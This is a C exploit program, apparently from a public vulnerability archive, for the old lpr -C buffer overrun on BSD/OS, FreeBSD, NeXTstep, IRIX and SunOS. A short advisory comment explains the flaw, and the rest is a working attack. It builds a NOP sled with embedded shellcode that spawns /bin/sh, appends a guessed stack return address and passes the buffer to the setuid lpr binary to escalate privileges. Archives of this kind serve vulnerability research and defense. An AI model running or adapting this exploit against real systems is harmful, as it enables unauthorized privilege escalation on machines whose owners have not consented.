/*
source: http://www.securityfocus.com/bid/707/info

BSD/OS 2.1,FreeBSD 2.1.5,NeXTstep 4.0/4.1,SGI IRIX 6.4,SunOS 4.1.3/4.1.4 lpr Buffer Overrun Vulnerability (1) 

Due to insufficient bounds checking on arguments (in this case -C) which are supplied by users, it is possible to overwrite the internal stack space of the lpr program while it is executing. This can allow an intruder to cause lpr to execute arbitrary commands by supplying a carefully designed argument to lpr. These commands will be run with the privileges of the lpr program. When lpr is installed setuid or setgid, it may allow intruders to gain those privileges.
*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET 50
#define BUFFER_SIZE 1023

long get_esp(void)
{
   __asm__("movl %esp,%eax\n");
}

void main()
{
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;

   u_char execshell[] = "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
                        "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
                        "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
                        "\xd7\xff\xff\xff/bin/sh";
   int i;

   buff = malloc(4096);
   if(!buff)
   {
      printf("can't allocate memory\n");
      exit(0);
   }
   ptr = buff;
   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
   ptr += BUFFER_SIZE-strlen(execshell);
   for(i=0;i < strlen(execshell);i++)
      *(ptr++) = execshell[i];
   addr_ptr = (long *)ptr;
   for(i=0;i<2;i++)
      *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
}